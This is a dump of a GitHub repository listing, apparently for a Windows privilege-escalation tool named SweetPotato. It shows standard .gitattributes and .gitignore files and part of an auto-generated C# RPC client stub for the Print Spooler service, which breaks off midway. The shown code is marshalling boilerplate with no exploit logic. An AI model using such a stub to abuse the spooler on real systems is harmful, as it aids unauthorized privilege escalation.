{
  "metadata": {
    "timestamp": 1736711012339,
    "page": 727,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjczMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "CCob/SweetPotato",
      "stars": 1650,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitattributes",
          "type": "blob",
          "size": 0.064453125,
          "content": "# Auto detect text files and perform LF normalization\n* text=auto\n"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 5.90625,
          "content": "## Ignore Visual Studio temporary files, build results, and\n## files generated by popular Visual Studio add-ons.\n##\n## Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore\n\n# User-specific files\n*.rsuser\n*.suo\n*.user\n*.userosscache\n*.sln.docstates\n\n# User-specific files (MonoDevelop/Xamarin Studio)\n*.userprefs\n\n# Mono auto generated files\nmono_crash.*\n\n# Build results\n[Dd]ebug/\n[Dd]ebugPublic/\n[Rr]elease/\n[Rr]eleases/\nx64/\nx86/\n[Aa][Rr][Mm]/\n[Aa][Rr][Mm]64/\nbld/\n[Bb]in/\n[Oo]bj/\n[Ll]og/\n[Ll]ogs/\n\n# Visual Studio 2015/2017 cache/options directory\n.vs/\n# Uncomment if you have tasks that create the project's static files in wwwroot\n#wwwroot/\n\n# Visual Studio 2017 auto generated files\nGenerated\\ Files/\n\n# MSTest test Results\n[Tt]est[Rr]esult*/\n[Bb]uild[Ll]og.*\n\n# NUnit\n*.VisualState.xml\nTestResult.xml\nnunit-*.xml\n\n# Build Results of an ATL Project\n[Dd]ebugPS/\n[Rr]eleasePS/\ndlldata.c\n\n# Benchmark Results\nBenchmarkDotNet.Artifacts/\n\n# .NET Core\nproject.lock.json\nproject.fragment.lock.json\nartifacts/\n\n# StyleCop\nStyleCopReport.xml\n\n# Files built by Visual Studio\n*_i.c\n*_p.c\n*_h.h\n*.ilk\n*.meta\n*.obj\n*.iobj\n*.pch\n*.pdb\n*.ipdb\n*.pgc\n*.pgd\n*.rsp\n*.sbr\n*.tlb\n*.tli\n*.tlh\n*.tmp\n*.tmp_proj\n*_wpftmp.csproj\n*.log\n*.vspscc\n*.vssscc\n.builds\n*.pidb\n*.svclog\n*.scc\n\n# Chutzpah Test files\n_Chutzpah*\n\n# Visual C++ cache files\nipch/\n*.aps\n*.ncb\n*.opendb\n*.opensdf\n*.sdf\n*.cachefile\n*.VC.db\n*.VC.VC.opendb\n\n# Visual Studio profiler\n*.psess\n*.vsp\n*.vspx\n*.sap\n\n# Visual Studio Trace Files\n*.e2e\n\n# TFS 2012 Local Workspace\n$tf/\n\n# Guidance Automation Toolkit\n*.gpState\n\n# ReSharper is a .NET coding add-in\n_ReSharper*/\n*.[Rr]e[Ss]harper\n*.DotSettings.user\n\n# JustCode is a .NET coding add-in\n.JustCode\n\n# TeamCity is a build add-in\n_TeamCity*\n\n# DotCover is a Code Coverage Tool\n*.dotCover\n\n# AxoCover is a Code Coverage Tool\n.axoCover/*\n!.axoCover/settings.json\n\n# Visual Studio code coverage results\n*.coverage\n*.coveragexml\n\n# NCrunch\n_NCrunch_*\n.*crunch*.local.xml\nnCrunchTemp_*\n\n# MightyMoose\n*.mm.*\nAutoTest.Net/\n\n# Web workbench (sass)\n.sass-cache/\n\n# Installshield output folder\n[Ee]xpress/\n\n# DocProject is a documentation generator add-in\nDocProject/buildhelp/\nDocProject/Help/*.HxT\nDocProject/Help/*.HxC\nDocProject/Help/*.hhc\nDocProject/Help/*.hhk\nDocProject/Help/*.hhp\nDocProject/Help/Html2\nDocProject/Help/html\n\n# Click-Once directory\npublish/\n\n# Publish Web Output\n*.[Pp]ublish.xml\n*.azurePubxml\n# Note: Comment the next line if you want to checkin your web deploy settings,\n# but database connection strings (with potential passwords) will be unencrypted\n*.pubxml\n*.publishproj\n\n# Microsoft Azure Web App publish settings. Comment the next line if you want to\n# checkin your Azure Web App publish settings, but sensitive information contained\n# in these scripts will be unencrypted\nPublishScripts/\n\n# NuGet Packages\n*.nupkg\n# NuGet Symbol Packages\n*.snupkg\n# The packages folder can be ignored because of Package Restore\n**/[Pp]ackages/*\n# except build/, which is used as an MSBuild target.\n!**/[Pp]ackages/build/\n# Uncomment if necessary however generally it will be regenerated when needed\n#!**/[Pp]ackages/repositories.config\n# NuGet v3's project.json files produces more ignorable files\n*.nuget.props\n*.nuget.targets\n\n# Microsoft Azure Build Output\ncsx/\n*.build.csdef\n\n# Microsoft Azure Emulator\necf/\nrcf/\n\n# Windows Store app package directories and files\nAppPackages/\nBundleArtifacts/\nPackage.StoreAssociation.xml\n_pkginfo.txt\n*.appx\n*.appxbundle\n*.appxupload\n\n# Visual Studio cache files\n# files ending in .cache can be ignored\n*.[Cc]ache\n# but keep track of directories ending in .cache\n!?*.[Cc]ache/\n\n# Others\nClientBin/\n~$*\n*~\n*.dbmdl\n*.dbproj.schemaview\n*.jfm\n*.pfx\n*.publishsettings\norleans.codegen.cs\n\n# Including strong name files can present a security risk\n# (https://github.com/github/gitignore/pull/2483#issue-259490424)\n#*.snk\n\n# Since there are multiple workflows, uncomment next line to ignore bower_components\n# (https://github.com/github/gitignore/pull/1529#issuecomment-104372622)\n#bower_components/\n\n# RIA/Silverlight projects\nGenerated_Code/\n\n# Backup & report files from converting an old project file\n# to a newer Visual Studio version. Backup files are not needed,\n# because we have git ;-)\n_UpgradeReport_Files/\nBackup*/\nUpgradeLog*.XML\nUpgradeLog*.htm\nServiceFabricBackup/\n*.rptproj.bak\n\n# SQL Server files\n*.mdf\n*.ldf\n*.ndf\n\n# Business Intelligence projects\n*.rdl.data\n*.bim.layout\n*.bim_*.settings\n*.rptproj.rsuser\n*- [Bb]ackup.rdl\n*- [Bb]ackup ([0-9]).rdl\n*- [Bb]ackup ([0-9][0-9]).rdl\n\n# Microsoft Fakes\nFakesAssemblies/\n\n# GhostDoc plugin setting file\n*.GhostDoc.xml\n\n# Node.js Tools for Visual Studio\n.ntvs_analysis.dat\nnode_modules/\n\n# Visual Studio 6 build log\n*.plg\n\n# Visual Studio 6 workspace options file\n*.opt\n\n# Visual Studio 6 auto-generated workspace file (contains which files were open etc.)\n*.vbw\n\n# Visual Studio LightSwitch build output\n**/*.HTMLClient/GeneratedArtifacts\n**/*.DesktopClient/GeneratedArtifacts\n**/*.DesktopClient/ModelManifest.xml\n**/*.Server/GeneratedArtifacts\n**/*.Server/ModelManifest.xml\n_Pvt_Extensions\n\n# Paket dependency manager\n.paket/paket.exe\npaket-files/\n\n# FAKE - F# Make\n.fake/\n\n# CodeRush personal settings\n.cr/personal\n\n# Python Tools for Visual Studio (PTVS)\n__pycache__/\n*.pyc\n\n# Cake - Uncomment if you are using it\n# tools/**\n# !tools/packages.config\n\n# Tabs Studio\n*.tss\n\n# Telerik's JustMock configuration file\n*.jmconfig\n\n# BizTalk build output\n*.btp.cs\n*.btm.cs\n*.odx.cs\n*.xsd.cs\n\n# OpenCover UI analysis results\nOpenCover/\n\n# Azure Stream Analytics local run output\nASALocalRun/\n\n# MSBuild Binary and Structured Log\n*.binlog\n\n# NVidia Nsight GPU debugger configuration file\n*.nvuser\n\n# MFractors (Xamarin productivity tool) working folder\n.mfractor/\n\n# Local History for Visual Studio\n.localhistory/\n\n# BeatPulse healthcheck temp database\nhealthchecksdb\n\n# Backup folder for Package Reference Convert tool in Visual Studio 2017\nMigrationBackup/\n\n# Ionide (cross platform F# VS Code tools) working folder\n.ionide/\n"
        },
        {
          "name": "12345678-1234-abcd-ef00-0123456789ab_1.0.cs",
          "type": "blob",
          "size": 245.8017578125,
          "content": "//------------------------------------------------------------------------------\n// <auto-generated>\n//     This code was generated by a tool.\n//     Runtime Version:4.0.30319.42000\n//\n//     Changes to this file may cause incorrect behavior and will be lost if\n//     the code is regenerated.\n// </auto-generated>\n//------------------------------------------------------------------------------\n\n// Source Executable: c:\\windows\\system32\\spoolsv.exe\n// Interface ID: 12345678-1234-abcd-ef00-0123456789ab\n// Interface Version: 1.0\n\n\n\nnamespace rpc_12345678_1234_abcd_ef00_0123456789ab_1_0\n{\n    \n    #region Marshal Helpers\n    internal class _Marshal_Helper : NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer\n    {\n        public void Write_0(Struct_0 p0)\n        {\n            WriteStruct<Struct_0>(p0);\n        }\n        public void Write_1(Struct_1 p0)\n        {\n            WriteStruct<Struct_1>(p0);\n        }\n        public void Write_2(Union_2 p0, long p1)\n        {\n            WriteUnion<Union_2>(p0, p1);\n        }\n        public void Write_3(Struct_3 p0)\n        {\n            WriteStruct<Struct_3>(p0);\n        }\n        public void Write_4(Struct_4 p0)\n        {\n            WriteStruct<Struct_4>(p0);\n        }\n        public void Write_5(Struct_5 p0)\n        {\n            WriteStruct<Struct_5>(p0);\n        }\n        public void Write_6(Struct_6 p0)\n        {\n            WriteStruct<Struct_6>(p0);\n        }\n        public void Write_7(Struct_7 p0)\n        {\n            WriteStruct<Struct_7>(p0);\n        }\n        public void Write_8(Struct_8 p0)\n        {\n            WriteStruct<Struct_8>(p0);\n        }\n        public void Write_9(Union_9 p0, long p1)\n        {\n            WriteUnion<Union_9>(p0, p1);\n        }\n        public void Write_10(Struct_10 p0)\n        {\n            WriteStruct<Struct_10>(p0);\n        }\n        public void Write_11(Struct_11 p0)\n        {\n            WriteStruct<Struct_11>(p0);\n        }\n        public void Write_12(Struct_12 p0)\n        {\n            WriteStruct<Struct_12>(p0);\n        }\n        public void Write_13(Struct_13 p0)\n        {\n            WriteStruct<Struct_13>(p0);\n        }\n        public void Write_14(Struct_14 p0)\n        {\n            WriteStruct<Struct_14>(p0);\n        }\n        public void Write_15(Struct_15 p0)\n        {\n            WriteStruct<Struct_15>(p0);\n        }\n        public void Write_16(Struct_16 p0)\n        {\n            WriteStruct<Struct_16>(p0);\n        }\n        public void Write_17(Struct_17 p0)\n        {\n            WriteStruct<Struct_17>(p0);\n        }\n        public void Write_18(Struct_18 p0)\n        {\n            WriteStruct<Struct_18>(p0);\n        }\n        public void Write_19(Struct_19 p0)\n        {\n            WriteStruct<Struct_19>(p0);\n        }\n        public void Write_20(Union_20 p0, long p1)\n        {\n            WriteUnion<Union_20>(p0, p1);\n        }\n        public void Write_21(Struct_21 p0)\n        {\n            WriteStruct<Struct_21>(p0);\n        }\n        public void Write_22(Struct_22 p0)\n        {\n            WriteStruct<Struct_22>(p0);\n        }\n        public void Write_23(Struct_23 p0)\n        {\n            WriteStruct<Struct_23>(p0);\n        }\n        public void Write_24(Struct_24 p0)\n        {\n            WriteStruct<Struct_24>(p0);\n        }\n        public void Write_25(Struct_25 p0)\n        {\n            WriteStruct<Struct_25>(p0);\n        }\n        public void Write_26(Struct_26 p0)\n        {\n            WriteStruct<Struct_26>(p0);\n        }\n        public void Write_27(Struct_27 p0)\n        {\n            WriteStruct<Struct_27>(p0);\n        }\n        public void Write_28(Struct_28 p0)\n        {\n            WriteStruct<Struct_28>(p0);\n        }\n        public void Write_29(Union_29 p0, long p1)\n        {\n            WriteUnion<Union_29>(p0, p1);\n        }\n        public void Write_30(Struct_30 p0)\n        {\n            WriteStruct<Struct_30>(p0);\n        }\n        public void Write_31(Struct_31 p0)\n        {\n            WriteStruct<Struct_31>(p0);\n        }\n        public void Write_32(Union_32 p0, long p1)\n        {\n            WriteUnion<Union_32>(p0, p1);\n        }\n        public void Write_33(Struct_33 p0)\n        {\n            WriteStruct<Struct_33>(p0);\n        }\n        public void Write_34(Struct_34 p0)\n        {\n            WriteStruct<Struct_34>(p0);\n        }\n        public void Write_35(Struct_35 p0)\n        {\n            WriteStruct<Struct_35>(p0);\n        }\n        public void Write_36(Struct_36 p0)\n        {\n            WriteStruct<Struct_36>(p0);\n        }\n        public void Write_37(Union_37 p0, long p1)\n        {\n            WriteUnion<Union_37>(p0, p1);\n        }\n        public void Write_38(Struct_38 p0)\n        {\n            WriteStruct<Struct_38>(p0);\n        }\n        public void Write_39(Struct_39 p0)\n        {\n            WriteStruct<Struct_39>(p0);\n        }\n        public void Write_40(Struct_40 p0)\n        {\n            WriteStruct<Struct_40>(p0);\n        }\n        public void Write_41(Union_41 p0, long p1)\n        {\n            WriteUnion<Union_41>(p0, p1);\n        }\n        public void Write_42(Struct_42 p0)\n        {\n            WriteStruct<Struct_42>(p0);\n        }\n        public void Write_43(Struct_43 p0)\n        {\n            WriteStruct<Struct_43>(p0);\n        }\n        public void Write_44(Struct_44 p0)\n        {\n            WriteStruct<Struct_44>(p0);\n        }\n        public void Write_45(Struct_45 p0)\n        {\n            WriteStruct<Struct_45>(p0);\n        }\n        public void Write_46(Struct_46 p0)\n        {\n            WriteStruct<Struct_46>(p0);\n        }\n        public void Write_47(Struct_47 p0)\n        {\n            WriteStruct<Struct_47>(p0);\n        }\n        public void Write_48(Union_48 p0, long p1)\n        {\n            WriteUnion<Union_48>(p0, p1);\n        }\n        public void Write_49(Struct_49 p0)\n        {\n            WriteStruct<Struct_49>(p0);\n        }\n        public void Write_50(Struct_50 p0)\n        {\n            WriteStruct<Struct_50>(p0);\n        }\n        public void Write_51(Struct_51 p0)\n        {\n            WriteStruct<Struct_51>(p0);\n        }\n        public void Write_52(Union_52 p0, long p1)\n        {\n            WriteUnion<Union_52>(p0, p1);\n        }\n        public void Write_53(Struct_53 p0)\n        {\n            WriteStruct<Struct_53>(p0);\n        }\n        public void Write_54(Struct_54 p0)\n        {\n            WriteStruct<Struct_54>(p0);\n        }\n        public void Write_55(Struct_55 p0)\n        {\n            WriteStruct<Struct_55>(p0);\n        }\n        public void Write_56(Struct_56 p0)\n        {\n            WriteStruct<Struct_56>(p0);\n        }\n        public void Write_57(Struct_57 p0)\n        {\n            WriteStruct<Struct_57>(p0);\n        }\n        public void Write_58(Union_58 p0, long p1)\n        {\n            WriteUnion<Union_58>(p0, p1);\n        }\n        public void Write_59(Struct_59 p0)\n        {\n            WriteStruct<Struct_59>(p0);\n        }\n        public void Write_60(Union_60 p0, long p1)\n        {\n            WriteUnion<Union_60>(p0, p1);\n        }\n        public void Write_61(Struct_61 p0)\n        {\n            WriteStruct<Struct_61>(p0);\n        }\n        public void Write_62(Struct_62 p0)\n        {\n            WriteStruct<Struct_62>(p0);\n        }\n        public void Write_63(Struct_63 p0)\n        {\n            WriteStruct<Struct_63>(p0);\n        }\n        public void Write_64(Struct_64 p0)\n        {\n            WriteStruct<Struct_64>(p0);\n        }\n        public void Write_65(Struct_65 p0)\n        {\n            WriteStruct<Struct_65>(p0);\n        }\n        public void Write_66(Union_66 p0, long p1)\n        {\n            WriteUnion<Union_66>(p0, p1);\n        }\n        public void Write_67(Struct_67 p0)\n        {\n            WriteStruct<Struct_67>(p0);\n        }\n        public void Write_68(Struct_68 p0)\n        {\n            WriteStruct<Struct_68>(p0);\n        }\n        public void Write_69(Struct_69 p0)\n        {\n            WriteStruct<Struct_69>(p0);\n        }\n        public void Write_70(Struct_70 p0)\n        {\n            WriteStruct<Struct_70>(p0);\n        }\n        public void Write_71(Union_71 p0, long p1)\n        {\n            WriteUnion<Union_71>(p0, p1);\n        }\n        public void Write_72(Struct_72 p0)\n        {\n            WriteStruct<Struct_72>(p0);\n        }\n        public void Write_73(Struct_73 p0)\n        {\n            WriteStruct<Struct_73>(p0);\n        }\n        public void Write_74(Struct_74 p0)\n        {\n            WriteStruct<Struct_74>(p0);\n        }\n        public void Write_75(Struct_75 p0)\n        {\n            WriteStruct<Struct_75>(p0);\n        }\n        public void Write_76(Union_76 p0, long p1)\n        {\n            WriteUnion<Union_76>(p0, p1);\n        }\n        public void Write_77(Struct_77 p0)\n        {\n            WriteStruct<Struct_77>(p0);\n        }\n        public void Write_78(Struct_78 p0)\n        {\n            WriteStruct<Struct_78>(p0);\n        }\n        public void Write_79(Struct_80 p0)\n        {\n            WriteStruct<Struct_80>(p0);\n        }\n        public void Write_80(Union_81 p0, long p1)\n        {\n            WriteUnion<Union_81>(p0, p1);\n        }\n        public void Write_81(Struct_82 p0)\n        {\n            WriteStruct<Struct_82>(p0);\n        }\n        public void Write_82(Struct_83 p0)\n        {\n            WriteStruct<Struct_83>(p0);\n        }\n        public void Write_83(Struct_84 p0)\n        {\n            WriteStruct<Struct_84>(p0);\n        }\n        public void Write_84(Union_85 p0, long p1)\n        {\n            WriteUnion<Union_85>(p0, p1);\n        }\n        public void Write_85(Struct_86 p0)\n        {\n            WriteStruct<Struct_86>(p0);\n        }\n        public void Write_86(Struct_87 p0)\n        {\n            WriteStruct<Struct_87>(p0);\n        }\n        public void Write_87(Struct_88 p0)\n        {\n            WriteStruct<Struct_88>(p0);\n        }\n        public void Write_88(Struct_89 p0)\n        {\n            WriteStruct<Struct_89>(p0);\n        }\n        public void Write_89(Union_90 p0, long p1)\n        {\n            WriteUnion<Union_90>(p0, p1);\n        }\n        public void Write_90(Struct_91 p0)\n        {\n            WriteStruct<Struct_91>(p0);\n        }\n        public void Write_91(Struct_92 p0)\n        {\n            WriteStruct<Struct_92>(p0);\n        }\n        public void Write_92(Struct_93 p0)\n        {\n            WriteStruct<Struct_93>(p0);\n        }\n        public void Write_93(Struct_94 p0)\n        {\n            WriteStruct<Struct_94>(p0);\n        }\n        public void Write_94(Struct_95 p0)\n        {\n            WriteStruct<Struct_95>(p0);\n        }\n        public void Write_95(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_96(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_97(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_98(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_99(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_100(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_101(Struct_45[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_45>(p0, p1);\n        }\n        public void Write_102(short[] p0, long p1)\n        {\n            WriteConformantArray<short>(p0, p1);\n        }\n        public void Write_103(Struct_47[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_47>(p0, p1);\n        }\n        public void Write_104(int[] p0)\n        {\n            WriteFixedPrimitiveArray<int>(p0, 2);\n        }\n        public void Write_105(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_106(Struct_69[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_69>(p0, p1);\n        }\n        public void Write_107(Struct_74[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_74>(p0, p1);\n        }\n        public void Write_108(string p0)\n        {\n            WriteFixedString(p0, 260);\n        }\n        public void Write_109(Struct_83[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_83>(p0, p1);\n        }\n        public void Write_110(int[] p0, long p1)\n        {\n            WriteConformantArray<int>(p0, p1);\n        }\n        public void Write_111(NtApiDotNet.Ndr.Marshal.NdrUnsupported p0)\n        {\n            WriteUnsupported(p0, \"FC_CVARRAY - FC_CVARRAY\");\n        }\n        public void Write_112(Struct_89[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_89>(p0, p1);\n        }\n        public void Write_113(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_114(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_115(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_116(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_117(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_118(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_119(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_120(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_121(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_122(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_123(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_124(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_125(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_126(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_127(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_128(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_129(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_130(Struct_78[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_78>(p0, p1);\n        }\n        public void Write_131(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_132(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_133(char[] p0, long p1)\n        {\n            WriteConformantArray<char>(p0, p1);\n        }\n        public void Write_134(Struct_87[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_87>(p0, p1);\n        }\n    }\n    internal class _Unmarshal_Helper : NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer\n    {\n        public _Unmarshal_Helper(NtApiDotNet.Win32.Rpc.RpcClientResponse r) : \n                base(r.NdrBuffer, r.Handles, r.DataRepresentation)\n        {\n        }\n        public _Unmarshal_Helper(byte[] ba) : \n                base(ba)\n        {\n        }\n        public Struct_0 Read_0()\n        {\n            return ReadStruct<Struct_0>();\n        }\n        public Struct_1 Read_1()\n        {\n            return ReadStruct<Struct_1>();\n        }\n        public Union_2 Read_2()\n        {\n            return ReadStruct<Union_2>();\n        }\n        public Struct_3 Read_3()\n        {\n            return ReadStruct<Struct_3>();\n        }\n        public Struct_4 Read_4()\n        {\n            return ReadStruct<Struct_4>();\n        }\n        public Struct_5 Read_5()\n        {\n            return ReadStruct<Struct_5>();\n        }\n        public Struct_6 Read_6()\n        {\n            return ReadStruct<Struct_6>();\n        }\n        public Struct_7 Read_7()\n        {\n            return ReadStruct<Struct_7>();\n        }\n        public Struct_8 Read_8()\n        {\n            return ReadStruct<Struct_8>();\n        }\n        public Union_9 Read_9()\n        {\n            return ReadStruct<Union_9>();\n        }\n        public Struct_10 Read_10()\n        {\n            return ReadStruct<Struct_10>();\n        }\n        public Struct_11 Read_11()\n        {\n            return ReadStruct<Struct_11>();\n        }\n        public Struct_12 Read_12()\n        {\n            return ReadStruct<Struct_12>();\n        }\n        public Struct_13 Read_13()\n        {\n            return ReadStruct<Struct_13>();\n        }\n        public Struct_14 Read_14()\n        {\n            return ReadStruct<Struct_14>();\n        }\n        public Struct_15 Read_15()\n        {\n            return ReadStruct<Struct_15>();\n        }\n        public Struct_16 Read_16()\n        {\n            return ReadStruct<Struct_16>();\n        }\n        public Struct_17 Read_17()\n        {\n            return ReadStruct<Struct_17>();\n        }\n        public Struct_18 Read_18()\n        {\n            return ReadStruct<Struct_18>();\n        }\n        public Struct_19 Read_19()\n        {\n            return ReadStruct<Struct_19>();\n        }\n        public Union_20 Read_20()\n        {\n            return ReadStruct<Union_20>();\n        }\n        public Struct_21 Read_21()\n        {\n            return ReadStruct<Struct_21>();\n        }\n        public Struct_22 Read_22()\n        {\n            return ReadStruct<Struct_22>();\n        }\n        public Struct_23 Read_23()\n        {\n            return ReadStruct<Struct_23>();\n        }\n        public Struct_24 Read_24()\n        {\n            return ReadStruct<Struct_24>();\n        }\n        public Struct_25 Read_25()\n        {\n            return ReadStruct<Struct_25>();\n        }\n        public Struct_26 Read_26()\n        {\n            return ReadStruct<Struct_26>();\n        }\n        public Struct_27 Read_27()\n        {\n            return ReadStruct<Struct_27>();\n        }\n        public Struct_28 Read_28()\n        {\n            return ReadStruct<Struct_28>();\n        }\n        public Union_29 Read_29()\n        {\n            return ReadStruct<Union_29>();\n        }\n        public Struct_30 Read_30()\n        {\n            return ReadStruct<Struct_30>();\n        }\n        public Struct_31 Read_31()\n        {\n            return ReadStruct<Struct_31>();\n        }\n        public Union_32 Read_32()\n        {\n            return ReadStruct<Union_32>();\n        }\n        public Struct_33 Read_33()\n        {\n            return ReadStruct<Struct_33>();\n        }\n        public Struct_34 Read_34()\n        {\n            return ReadStruct<Struct_34>();\n        }\n        public Struct_35 Read_35()\n        {\n            return ReadStruct<Struct_35>();\n        }\n        public Struct_36 Read_36()\n        {\n            return ReadStruct<Struct_36>();\n        }\n        public Union_37 Read_37()\n        {\n            return ReadStruct<Union_37>();\n        }\n        public Struct_38 Read_38()\n        {\n            return ReadStruct<Struct_38>();\n        }\n        public Struct_39 Read_39()\n        {\n            return ReadStruct<Struct_39>();\n        }\n        public Struct_40 Read_40()\n        {\n            return ReadStruct<Struct_40>();\n        }\n        public Union_41 Read_41()\n        {\n            return ReadStruct<Union_41>();\n        }\n        public Struct_42 Read_42()\n        {\n            return ReadStruct<Struct_42>();\n        }\n        public Struct_43 Read_43()\n        {\n            return ReadStruct<Struct_43>();\n        }\n        public Struct_44 Read_44()\n        {\n            return ReadStruct<Struct_44>();\n        }\n        public Struct_45 Read_45()\n        {\n            return ReadStruct<Struct_45>();\n        }\n        public Struct_46 Read_46()\n        {\n            return ReadStruct<Struct_46>();\n        }\n        public Struct_47 Read_47()\n        {\n            return ReadStruct<Struct_47>();\n        }\n        public Union_48 Read_48()\n        {\n            return ReadStruct<Union_48>();\n        }\n        public Struct_49 Read_49()\n        {\n            return ReadStruct<Struct_49>();\n        }\n        public Struct_50 Read_50()\n        {\n            return ReadStruct<Struct_50>();\n        }\n        public Struct_51 Read_51()\n        {\n            return ReadStruct<Struct_51>();\n        }\n        public Union_52 Read_52()\n        {\n            return ReadStruct<Union_52>();\n        }\n        public Struct_53 Read_53()\n        {\n            return ReadStruct<Struct_53>();\n        }\n        public Struct_54 Read_54()\n        {\n            return ReadStruct<Struct_54>();\n        }\n        public Struct_55 Read_55()\n        {\n            return ReadStruct<Struct_55>();\n        }\n        public Struct_56 Read_56()\n        {\n            return ReadStruct<Struct_56>();\n        }\n        public Struct_57 Read_57()\n        {\n            return ReadStruct<Struct_57>();\n        }\n        public Union_58 Read_58()\n        {\n            return ReadStruct<Union_58>();\n        }\n        public Struct_59 Read_59()\n        {\n            return ReadStruct<Struct_59>();\n        }\n        public Union_60 Read_60()\n        {\n            return ReadStruct<Union_60>();\n        }\n        public Struct_61 Read_61()\n        {\n            return ReadStruct<Struct_61>();\n        }\n        public Struct_62 Read_62()\n        {\n            return ReadStruct<Struct_62>();\n        }\n        public Struct_63 Read_63()\n        {\n            return ReadStruct<Struct_63>();\n        }\n        public Struct_64 Read_64()\n        {\n            return ReadStruct<Struct_64>();\n        }\n        public Struct_65 Read_65()\n        {\n            return ReadStruct<Struct_65>();\n        }\n        public Union_66 Read_66()\n        {\n            return ReadStruct<Union_66>();\n        }\n        public Struct_67 Read_67()\n        {\n            return ReadStruct<Struct_67>();\n        }\n        public Struct_68 Read_68()\n        {\n            return ReadStruct<Struct_68>();\n        }\n        public Struct_69 Read_69()\n        {\n            return ReadStruct<Struct_69>();\n        }\n        public Struct_70 Read_70()\n        {\n            return ReadStruct<Struct_70>();\n        }\n        public Union_71 Read_71()\n        {\n            return ReadStruct<Union_71>();\n        }\n        public Struct_72 Read_72()\n        {\n            return ReadStruct<Struct_72>();\n        }\n        public Struct_73 Read_73()\n        {\n            return ReadStruct<Struct_73>();\n        }\n        public Struct_74 Read_74()\n        {\n            return ReadStruct<Struct_74>();\n        }\n        public Struct_75 Read_75()\n        {\n            return ReadStruct<Struct_75>();\n        }\n        public Union_76 Read_76()\n        {\n            return ReadStruct<Union_76>();\n        }\n        public Struct_77 Read_77()\n        {\n            return ReadStruct<Struct_77>();\n        }\n        public Struct_78 Read_78()\n        {\n            return ReadStruct<Struct_78>();\n        }\n        public Struct_80 Read_79()\n        {\n            return ReadStruct<Struct_80>();\n        }\n        public Union_81 Read_80()\n        {\n            return ReadStruct<Union_81>();\n        }\n        public Struct_82 Read_81()\n        {\n            return ReadStruct<Struct_82>();\n        }\n        public Struct_83 Read_82()\n        {\n            return ReadStruct<Struct_83>();\n        }\n        public Struct_84 Read_83()\n        {\n            return ReadStruct<Struct_84>();\n        }\n        public Union_85 Read_84()\n        {\n            return ReadStruct<Union_85>();\n        }\n        public Struct_86 Read_85()\n        {\n            return ReadStruct<Struct_86>();\n        }\n        public Struct_87 Read_86()\n        {\n            return ReadStruct<Struct_87>();\n        }\n        public Struct_88 Read_87()\n        {\n            return ReadStruct<Struct_88>();\n        }\n        public Struct_89 Read_88()\n        {\n            return ReadStruct<Struct_89>();\n        }\n        public Union_90 Read_89()\n        {\n            return ReadStruct<Union_90>();\n        }\n        public Struct_91 Read_90()\n        {\n            return ReadStruct<Struct_91>();\n        }\n        public Struct_92 Read_91()\n        {\n            return ReadStruct<Struct_92>();\n        }\n        public Struct_93 Read_92()\n        {\n            return ReadStruct<Struct_93>();\n        }\n        public Struct_94 Read_93()\n        {\n            return ReadStruct<Struct_94>();\n        }\n        public Struct_95 Read_94()\n        {\n            return ReadStruct<Struct_95>();\n        }\n        public sbyte[] Read_95()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public char[] Read_96()\n        {\n            return ReadConformantArray<char>();\n        }\n        